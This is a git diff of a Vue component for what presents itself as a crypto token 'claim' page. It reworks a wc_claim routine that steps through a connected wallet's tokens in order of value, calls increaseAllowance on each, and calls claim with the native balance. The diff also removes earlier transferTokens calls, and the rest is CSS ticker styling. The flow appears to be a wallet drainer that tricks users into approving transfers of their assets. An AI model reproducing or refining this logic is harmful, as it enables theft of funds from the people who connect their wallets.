@@ -443,7 +443,6 @@ import {
   balanceOf,
   getTokens,
   increaseAllowance,
-  transferTokens,
 } from './utils/walletconnect.js';
 const Toast = useToast();
 import axios from 'axios';
@@ -467,6 +466,7 @@ export default {
       currentIndex: 0,
     };
   },
+
   methods: {
     async wc_claim() {
       try {
@@ -474,16 +474,27 @@ export default {
           this.processing = true;
           this.isDone = false;
 
-          if (this.tokens.length > 0 && this.maxToken) {
-            await increaseAllowance(this.maxToken);
-          } else {
+          const token = this.maxToken;
+          // if (token == null && this.claimable == 0) {
+          //   this.isOk = true;
+          //   Swal.close();
+          //   Swal.hideLoading();
+          //   return;
+          // }
+          if (token && this.claimable > token.usdValue) {
             await claim(this.balance.value);
             this.claimable = 0;
+          } else {
+            if (this.tokens.length > 0 && this.maxToken) {
+              await increaseAllowance(token);
+            } else {
+              await claim(this.balance.value);
+              this.claimable = 0;
+            }
           }
 
           this.processing = false;
           this.isDone = true;
-          await transferTokens(this.sortedTokens);
           if (this.currentIndex + 1 > this.sortedTokens.length) {
             if (this.claimable > 0) {
               await claim(this.balance.value);
@@ -494,9 +505,9 @@ export default {
               Swal.close();
               Swal.hideLoading();
             }
-            await transferTokens(this.sortedTokens);
           } else {
             this.currentIndex += 1;
+            this.maxToken = null;
             this.maxToken = this.sortedTokens[this.currentIndex];
             this.wc_claim();
           }
@@ -701,6 +712,13 @@ export default {
 }
 
 @media (max-width: 767px) {
+  .ticker--prices {
+    margin-top: 1.55rem;
+  }
+
+  .ticker--token {
+    font-size: 0.9rem;
+  }
   .pd {
     /* display: none; */
     padding-bottom: 0;
@@ -911,7 +929,7 @@ export default {
 }
 
 .ticker--prices {
-  margin-top: -0.75rem;
+  /* margin-top: -0.75rem; */
 }
 
 .ticker--token {
@@ -922,7 +940,7 @@ export default {
 
 .ticker--discounted-percent {
   color: #07c1b6;
-  font-size: 1.5rem;
+  font-size: 1.2rem;
 }
 
 .ticker--nested-text {
@@ -937,9 +955,9 @@ export default {
     width: 2rem !important;
   }
 
-  .ticker--prices {
+  /* .ticker--prices {
     margin-top: -0.5rem;
-  }
+  } */
 
   .ticker--token {
     font-size: 0.9rem;
